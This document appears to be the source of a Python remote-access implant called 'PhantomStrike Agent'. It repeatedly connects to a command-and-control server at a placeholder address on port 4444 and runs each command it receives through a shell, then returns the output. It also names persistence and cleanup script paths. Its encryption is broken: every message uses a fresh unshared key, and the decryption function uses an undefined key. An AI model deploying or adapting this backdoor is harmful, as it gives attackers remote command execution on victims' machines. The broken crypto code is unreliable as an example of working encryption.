import socket
import subprocess
import os
import time
import base64
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import platform

# ASCII Art for PhantomStrike Agent
print("""
██████╗ ██╗  ██╗ █████╗ ███╗   ███╗ ████████╗ ███████╗
██╔══██╗██║  ██║██╔══██╗████╗ ████║ ╚══██╔══╝ ██╔════╝
██████╔╝███████║███████║██╔████╔██║    ██║    █████╗
██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║    ██║    ██╔══╝
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║    ██║    ███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝    ╚══════╝
           PhantomStrike - Agent 
                             
                                                          by https://github.com/Akkaiaj
""")

# Server info
SERVER_IP = 'YOUR_C2_SERVER_IP'
SERVER_PORT = 4444
PERSISTENCE_SCRIPT = '/etc/init.d/phantom_agent'
CLEANUP_SCRIPT = '/tmp/phantom_cleanup.sh'

# AES Encryption and Decryption
def encrypt_data(data):
    key = get_random_bytes(16)  # AES 128-bit key
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

def decrypt_data(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

# Connect to the C2 server
def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connected to the server.")
            return s
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            time.sleep(5)

# Send data to C2 server
def send_data(s, data):
    encrypted_data = encrypt_data(data)
    try:
        s.send(encrypted_data.encode())
    except Exception as e:
        print(f"[-] Failed to send data: {e}")

# Receive commands from C2 server
def receive_commands(s):
    try:
        data = s.recv(1024).decode()
        return decrypt_data(data)
    except Exception as e:
        print(f"[-] Failed to receive data: {e}")
        return ""

# Execute commands
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return f"[-] Error: {e}"

# Main function for agent
def main():
    s = connect_to_server()

    while True:
        command = receive_commands(s)
        if command:
            if command.lower() == 'exit':
                s.close()
                print("[+] Disconnected from server.")
                break
            else:
                result = execute_command(command)
                send_data(s, result)
        time.sleep(1)

if __name__ == "__main__":
    main()
